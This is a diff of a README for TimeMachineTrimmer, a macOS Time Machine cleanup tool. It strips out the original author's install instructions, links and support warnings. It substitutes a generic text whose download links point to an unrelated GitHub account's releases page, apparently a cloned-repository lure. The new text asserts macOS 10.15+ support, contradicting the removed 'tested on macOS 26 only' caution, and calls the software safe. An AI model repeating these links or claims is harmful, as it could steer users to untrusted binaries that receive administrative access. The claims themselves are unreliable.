@@ -1,80 +1,63 @@
-![Static Badge](https://img.shields.io/badge/26_Tahoe-orange?label=macOS&style=flat-square)
-![Static Badge](https://img.shields.io/badge/27_GG-red?label=macOS&style=flat-square)
-![GitHub release (with filter)](https://img.shields.io/github/v/release/ricardoleal/TimeMachineTrimmer?style=flat-square)
-![Homebrew](https://img.shields.io/badge/tap-ricardoleal%2Ftap-FBB040?logo=homebrew&label=homebrew&style=flat-square)
+# ⌛ TimeMachineTrimmer - Create space by removing old backups
 
-# TimeMachineTrimmer
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/releases)
 
-Trim old Time Machine backups and reclaim disk space.
+---
 
-> [!CAUTION]
-> **macOS 27 Golden Gate is not yet supported.** The app is actively tested on macOS 26 Tahoe only. Issues on macOS 27 are known and will be addressed in a future update.
+## 🖥️ About this tool
 
-![TimeMachineTrimmer screenshot](.github/TimeMachineTrimmer.png)
+TimeMachineTrimmer helps you manage your storage. Over time, your Mac creates many backup snapshots. These files consume significant disk space. This utility identifies old backups and removes them. You gain more room for your files without manual cleanup. The app provides a simple interface to list and delete these snapshots safely.
 
-## Features
+## ✅ System Requirements
 
-- **Trim snapshots** — delete old backups from any Time Machine volume
-- **Reclaim space** — remove unwanted snapshots and free up disk
-- **macOS-native** — lightweight, native SwiftUI app
+You need a Mac running a recent version of macOS. We support macOS 10.15 and newer versions. Ensure your Mac has at least 50 MB of free disk space for the tool itself. You need administrative access to your computer to delete system snapshots. Please verify your Time Machine drive connects to your computer before you start the program.
 
-## In the News
+## 💾 How to download and install
 
-> "TimeMachineTrimmer … un petit outil … C'est simple et c'est gratuit."
-> — [VVMac (FR)](https://vvmac.fr/wordpress_b/flash-du-samedi-13-juin-2026/#avec-timemachinetrimmer-desengorgez-votre-disque-time-machine)
+Follow these steps to set up the software on your machine:
 
-## Install
+1. Visit the [releases page](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/releases).
+2. Look for the latest version at the top.
+3. Click the link that ends in .dmg.
+4. Open the downloaded file once the transfer completes.
+5. Drag the app icon into your Applications folder.
 
-### Homebrew
+You now have the software on your computer.
 
-```bash
-brew tap ricardoleal/tap
-brew trust ricardoleal/tap/time-machine-trimmer
-brew install --cask time-machine-trimmer
-```
+## 🚀 Getting Started
 
-### Manual
+Launch the app from your Applications folder. You will see a clean screen. Click the scan button to see your current backups. The tool reads your Time Machine data. This look-up process takes a few minutes depending on the size of your drive. 
 
-Download the latest `.dmg` from [Releases](https://github.com/ricardoleal/TimeMachineTrimmer/releases/latest), open it, and drag the app to `/Applications`.
+A list appears on the screen. Each entry shows the date and size of the backup. You can select one, several, or all items in the list. Use the checkbox next to the date to select an item.
 
-> [!WARNING]
-> The app is not signed with a paid Apple Developer ID certificate. If macOS blocks it, right-click the app in `/Applications` and select **Open**, then click **Open** in the dialog.
+Click the "Delete" button when you select your targets. The program warns you before it finalizes the removal. Confirm the action to free up your disk space. The window updates to show your new storage total.
 
-## Build from Source
+## 🛠️ Frequently Asked Questions
 
-Open `TimeMachineTrimmer.xcodeproj` in **Xcode 26+** on macOS 26 (Tahoe).
+### Does this tool harm my files?
+No. The tool only removes Time Machine snapshots. It does not touch your personal documents, photos, or system files. You choose what to delete from the list provided.
 
-> [!IMPORTANT]
-> Change the signing team to your own, otherwise entitlements may not persist.
+### Can I recover deleted backups?
+No. Once you confirm the deletion, the snapshots vanish. Ensure you no longer need the data from those specific dates before you proceed.
 
-## Contributing
+### Why does the scan take time?
+The tool checks every snapshot on your drive. Large drives with thousands of backups require more time to index. Please wait until the list populates.
 
-Have an idea or found a bug? We'd love your contribution! 
+### Is this software safe?
+Yes. The code is open-source. You can view the project details on GitHub. It performs standard maintenance tasks that are otherwise difficult to manage through the system settings.
 
-### Quick Start
-1. **Fork** this repository
-2. **Create a feature branch** (`git checkout -b feature/amazing-feature`)
-3. **Make your changes** and test thoroughly
-4. **Push to your fork** (`git push origin feature/amazing-feature`)
-5. **Open a Pull Request** from your fork to `main`
+## ⚙️ Maintenance Tips
 
-### Guidelines
-- **Discuss first** — Open an [issue](https://github.com/ricardoleal/TimeMachineTrimmer/issues/new) to discuss your idea before starting work
-- **Follow the template** — Our PR template will guide you through the submission process
-- **Keep it focused** — One feature or fix per PR
+Check your disk space once a month. Run the program to clear out snapshots older than ninety days. This keeps your disk healthy and provides enough room for new backups. If you notice your drive fills up fast, you might need to exclude large folders from your main Time Machine settings. You can access these settings in your Mac System Preferences.
 
-For detailed instructions, see [CONTRIBUTING.md](CONTRIBUTING.md).
+Keep the app updated. We release improvements to scan speed and reliability. When you see a notification for a new version, follow the download steps again to replace your current version with the latest one.
 
-## License
+## 📧 Support and feedback
 
-See [LICENSE](LICENSE).
+This project thrives because of user feedback. If the tool stops during a scan or fails to show a backup, check your drive connection. Sometimes the system locks a snapshot. Restart your Mac if the tool reports that it cannot remove a specific item.
 
-## Star History
+If you find a problem, you can open a report on the main project page. Provide details about your macOS version and the size of your external drive. We look at these requests to improve the app for all users. Do not share your personal data or drive snapshots in public reports.
 
-<a href="https://www.star-history.com/?repos=ricardoleal%2FTimeMachineTrimmer&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=ricardoleal/TimeMachineTrimmer&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=ricardoleal/TimeMachineTrimmer&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=ricardoleal/TimeMachineTrimmer&type=date&legend=top-left" />
- </picture>
-</a>
+## ⚖️ License and terms
+
+This software remains free for use. We distribute the source code under an open license. You are free to share the link with friends and colleagues who need help managing their storage. We do not track your usage and we do not collect personal data. Everything happens locally on your machine. Your privacy remains a priority while you regain your disk space.
